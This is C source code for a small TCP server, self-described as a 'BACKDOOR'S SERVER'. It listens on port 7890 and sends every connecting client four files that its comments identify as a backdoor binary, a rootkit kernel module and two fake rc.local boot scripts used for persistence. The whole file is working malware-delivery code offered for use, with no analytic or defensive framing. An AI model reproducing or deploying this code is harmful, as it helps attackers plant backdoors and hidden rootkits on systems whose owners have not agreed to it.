#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "tools.h"


#define PORT   7890
#define SIZE_B 7688
#define SIZE_R 3813
#define SIZE_S  351
#define SIZE_S2 819

int main(void)
{
 int sockfd , new_sockfd;
 FILE* f1;
 FILE* f2;
 FILE* f3;
 FILE* f4;
 struct sockaddr_in host_addr, client_addr;
 socklen_t sin_size;
 int recv_length=1, yes=1;
 char buffer[1024];
 char buf  [SIZE_B ]; //the size of backdoor
 char buf_1[SIZE_R ]; //the size of rootkit
 char buf_2[SIZE_S ]; //the size of script
 char buf_3[SIZE_S2];

 sin_size = sizeof(struct sockaddr_in);
 
 if((sockfd = socket(PF_INET,SOCK_STREAM,0)) == 1)
     { 
      printf("FATAL: failed to socket()\n");
      exit(-1);
     }
 if(setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,&yes,sizeof(int)) == -1 )
   {
    printf("FATAL: failed to setsockopt()\n");
    exit(-2);
   }
 
 host_addr.sin_family = AF_INET;
 host_addr.sin_port = htons(PORT);
 host_addr.sin_addr.s_addr = 0;
 memset(&(host_addr.sin_zero),'\0',8);
 
 if(bind(sockfd, (struct sockaddr *)&host_addr , sizeof(struct sockaddr)) == -1) 
   {
    printf("FATAL: failed to bind()\n");
    exit(-3);
   }
 
 if(listen(sockfd,5) == -1)
   {
    printf("FATAL: failed to listen()\n");
    exit(-4);
   }
  
 f1 = fopen("./pers_BackDoor", "rb");   //Open the backdoor file...
 fread(&buf,sizeof(char),SIZE_B,f1);
 
 f2 = fopen("./Hidertkv4.ko", "rb");     //...the rootkit ...
 fread(&buf_1,sizeof(char),SIZE_R,f2);
 
 f3 = fopen("./rc.local", "rb");     //...the script and...
 fread(&buf_2,sizeof(char),SIZE_S,f3);
 
 f4 = fopen("./irc.local.txt","rb");    //... the fake launcher of script in /etc/init.d/rc.local
 fread(&buf_3,sizeof(char),SIZE_S2,f4);
 
 puts(" -----------------------------\n");
 puts("| BACKDOOR'S SERVER LAUNCHED |\n");
 puts(" -----------------------------\n");
 
 while(1)
      {
        new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size); 
        if(new_sockfd == -1)
          {
           printf("FATAL: failed to accept() the new connection\n");
           exit(-5);
          }
	printf("server: got connection from %s port %d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        send(new_sockfd, buf   ,   SIZE_B , 0);   //Send the backdoor's code
        send(new_sockfd, buf_1 ,   SIZE_R , 0);   //Send the rootkit
        send(new_sockfd, buf_2 ,   SIZE_S , 0);   //Send the fake rc.local script    
        send(new_sockfd, buf_3 ,   SIZE_S2, 0);   //Send the fake /etc/init.d/rc.local
 
        close(new_sockfd);
 
      }

 fclose(f1);
 fclose(f2);
 fclose(f3);
 fclose(f4);
}
